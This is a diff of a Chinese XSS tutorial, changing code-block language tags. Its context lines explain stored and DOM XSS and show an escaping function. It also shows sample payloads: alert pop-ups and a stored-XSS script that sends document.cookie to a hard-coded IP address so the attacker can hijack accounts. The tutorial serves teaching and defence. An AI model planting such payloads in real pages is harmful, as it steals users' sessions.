@@ -62,7 +62,7 @@ https: //xxx.com/search?query=<img src="enpty.png" onerror="alert('xss')">
 有个论坛，大家可以发布留言。然后后面的用户进来可以看到这些留言
 * 如果说留言是一个文本输入框，那么攻击者如果输入 `<script>alert('这里我注入一些恶意代码')</script>` 那么浏览器就会执行里面的代码，所有进入这个页面的用户，就都会弹出这些内容。
 * 同样是这个输入框，如果用户是写入的如下代码 
-  ```js
+  ```javascript
   <script>document.write('<img src="http://172.22.144.20/?'+document.cookie+'"/>');</script>
   ```
   那么用户浏览到这个页面的时候，就会把自己的 cookie 发送到这台机器上。然后攻击者可以使用拿到的 cookie 信息，登录账号做一些恶意行为
@@ -107,7 +107,7 @@ DOM 型指的是：攻击者构建了特殊的 URL，用户打开网站后， js
 
 
 比如对于 `"`、`<`、`>`、`/`、`&`、`'` 等进行转义
-```js
+```javascript
 function escape(str) {
   str = str.replace(/&/g, '&amp;')
   str = str.replace(/</g, '&lt;')
